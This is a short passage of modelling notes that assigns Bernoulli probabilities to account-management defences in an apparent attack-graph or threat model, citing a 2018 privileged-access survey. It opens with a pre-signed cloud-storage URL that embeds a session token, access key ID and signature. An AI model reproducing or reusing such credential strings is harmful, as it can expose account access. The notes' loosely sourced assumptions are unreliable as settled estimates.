https://user-assets-unbounce-com.s3.amazonaws.com/6766c3ae-2136-11e4-bdef-22000ac464fa/7642bd17-721e-4387-88dc-876a8c9010d2/2018-global-state-of-pam-risk-and-compliance.original.pdf?x-amz-security-token=IQoJb3JpZ2luX2VjEFsaDGV1LWNlbnRyYWwtMSJHMEUCIQDdcZKxpHFwZaxhbnR5hEgg2hKdVuoST3VxzFAgPkh1iAIgSenff7pYC6njzQ9rW%2BnoK4YsrWSNKl4tTiv3Vebx1XYqwgMI1P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgwwMDI2ODI4MTk5MzMiDOCH7G1kdjOpU5psByqWA%2BF2%2BAtv4oSLMfgZqaPZxu64PRbFAusODwreiOY0cAawqeSC4Rejgd4tHYZDGgHJKJZRuTU86LPmmGs9ljuDxWzs9IagcJcYL60ShALgCPrabaVJDRLx1DMpxWWgBkZhPplC8ydWmZf0e985euigl799d158qXC7MtAyQ%2FrrfZNNAuI17gcE%2Bg9k%2FQLyFWAajcyagi4IiucuRjxRAOcBjboF3whDBUYHqL4jKzY8MeAniBj0dkqCdSnSMA4v9B9C0br%2FPnO5zC3mZtY3tVe%2FKg%2FjjGw6GbfHArv9YQilbMRb%2FubUlIjwDsecHeE2dz52KBJjZi0ov0mq36loeekyVXbrV7m%2FKj3D4sxLhauLpQA4NIYqECf1%2FBCwMrD4W0%2BL80lnbkSNV%2B%2FGeu8rWX2gxQWj5CGJESpUWyNYsTO8lWjrmWlxB4yonaM41Q0YNApQy91RSxLouPCC0L7dbICZ4I%2FHq2X8RS9o8Dxb%2BBk%2FmgAPnXdCYZptN4abdUI2E0wKbQSYRyPhN2DPbMEAzNsnfHfcGEvRR2ownuyn9wU67AFa3PqmZGBsOgFaKDhJJGKJpWFmZRaRhMSKzmH04cwas0cVFsLOvnDBUlaLjrJUDa9tV6HMaJ3DvBAD3plIgP1HAnJAGG0aN6LlMTRpwJpKHI1dY2ZEtr9tSPnS7meMq%2Bn1q0EjswGHh1U6uoIut2Og9leHd%2Bwzo%2F1elq0DxG%2BK0GTYG7j%2BomOsjVT%2F6QKcCHif1Gs20Qkp3H79gbiRSzPa%2B4DfaywVHH%2Fo2SxtR8jk9ywU2jnTNiyb3x1RzhHsVxh1Y20fViU56eo2Hyz3xz49sSXMgmO7knbSWaUPvDmP2SBtam%2FYaoZGeYYmhA%3D%3D&AWSAccessKeyId=ASIAQBH7ISVOQ2GD65JS&Expires=1592397675&Signature=t0z%2FwXGG6FQgxYvB1em8gGpK928%3D
https://lp.alpha-gen.co.uk/2018-global-state-of-pam/
According to this report 70% of companies don't have a proper Privileged Account Management.

We can thus assess that the probability distribution for Privileged Account Management is [Bernoulli(0.30)]

### User Account Management

We can assume that a company that has a proper Privileged Account Management has proper User Account Management and vice versa.

We can thus assess that the probability distribution for User Account Management is [Bernoulli(0.30)]

### Disable or remove feature or program 

Using the PowerShell probability found by Love and the probabilities for the 2 previous defense steps we could try to estimate the porbability distribution for this defense
https://www.researchgate.net/publication/262327083_Aggregating_vulnerability_metrics_in_enterprise_networks_using_attack_graphs


